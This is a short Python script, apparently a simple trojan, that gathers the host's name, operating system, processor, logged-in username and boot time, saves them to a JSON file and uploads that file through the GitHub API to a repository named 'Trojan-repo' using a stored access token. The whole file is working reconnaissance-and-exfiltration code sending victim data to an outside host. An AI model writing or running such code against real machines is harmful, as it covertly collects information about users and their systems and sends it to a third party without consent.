import socket
import platform
import psutil
from datetime import datetime
import os
import json
import requests
import base64
from dotenv import load_dotenv
from collections.abc import Mapping


class SystemEnumeration:
    def __init__(self):
        pass

    def gather_info(self):
        """
        Collects basic system information such as OS details, users, and running processes.
        """
        info = {
            "hostname": socket.gethostname(),
            "platform": platform.platform(),
            "architecture": platform.architecture(),
            "processor": platform.processor(),
            "username": os.environ.get("USER") or os.environ.get("USERNAME") or "Unknown",
            "boot_time": datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S"),
        }
        return info


# Create an instance of the SystemEnumeration class
security_tool = SystemEnumeration()

# Gather system information
print("Gathering system information...")
system_info = security_tool.gather_info()

# Print the system information
print(json.dumps(system_info, indent=4))

# Create a unique output file name using the username and current datetime
username = system_info.get("username", "Unknown")
current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
output_file = f"system_info_{username}_{current_time}.json"

# Write the system information to the output file
with open(output_file, "w") as file:
    file.write(json.dumps(system_info, indent=4))

print(f"System information has been saved to {output_file}.")

# GitHub repository details
repository_owner = "BlertaJashanica"
repository_name = "Trojan-repo"
file_path = "data/"+output_file  # Correct file path with filename
file_content = json.dumps(system_info, indent=4)  # Convert dict to JSON string for GitHub

load_dotenv()  # Load environment variables from .env file
github_token = os.getenv("GITHUB_TOKEN")

commit_message = 'Updated system info'

# GitHub API URL
api_url = f"https://api.github.com/repos/{repository_owner}/{repository_name}/contents/{file_path}"
headers = {
    "Authorization": f"Token {github_token}",
    "Accept": "application/vnd.github.v3+json"
}

# Encode the file content to Base64
file_content_encoded = base64.b64encode(file_content.encode()).decode()

# Check if the file already exists
response = requests.get(api_url, headers=headers)
if response.status_code == 200:
    current_file = response.json()
    sha = current_file["sha"]  # Get the current file's SHA for updates
else:
    sha = None  # File doesn't exist; it will be created

# Prepare the payload for the PUT request
payload = {
    "message": commit_message,
    "content": file_content_encoded,
    "sha": sha
}

# Push the file to GitHub
response = requests.put(api_url, json=payload, headers=headers)
if response.status_code in [200, 201]:
    print("File pushed successfully!")
else:
    print("An error occurred while pushing the file:", response.json())
